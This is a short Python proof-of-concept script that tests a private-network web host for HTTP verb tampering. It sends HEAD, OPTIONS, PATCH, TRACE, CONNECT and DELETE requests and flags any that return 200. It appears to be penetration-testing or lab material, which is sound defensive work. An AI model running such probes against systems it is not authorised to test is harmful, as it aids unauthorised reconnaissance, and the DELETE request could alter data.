#!/usr/bin/env python3
"""
PoC for HTTP Verb Tampering on 192.168.64.4
Vulnerability: Non-standard HTTP verbs accepted when they shouldn't be
"""
import urllib.request

target = "http://192.168.64.4"

# HTTP verbs to test (beyond standard GET/POST)
verbs = ["HEAD", "OPTIONS", "PATCH", "TRACE", "CONNECT", "DELETE"]

print("[+] HTTP Verb Tampering PoC")
print(f"[*] Target: {target}")
print("-" * 60)

for verb in verbs:
    print(f"\n[*] Testing: {verb}")
    
    try:
        req = urllib.request.Request(target, method=verb)
        with urllib.request.urlopen(req, timeout=5) as response:
            content = response.read()
            
            # Check if the verb was accepted
            if response.status == 200:
                print(f"   [!] VULNERABLE: {verb} returned HTTP 200 OK")
                print(f"       Response length: {len(content)} bytes")
            elif response.status == 405:
                print(f"   [-] {verb} properly rejected (HTTP 405 Method Not Allowed)")
            else:
                print(f"   [-] {verb} returned HTTP {response.status}")
    except urllib.error.HTTPError as e:
        if e.code == 405:
            print(f"   [-] {verb} properly rejected (HTTP 405)")
        elif e.code == 501:
            print(f"   [-] {verb} not implemented (HTTP 501)")
        else:
            print(f"   [-] {verb} returned HTTP {e.code}")
    except Exception as e:
        print(f"   [-] Error: {str(e)[:40]}")

print("\n[+] HTTP Verb Tampering PoC complete")
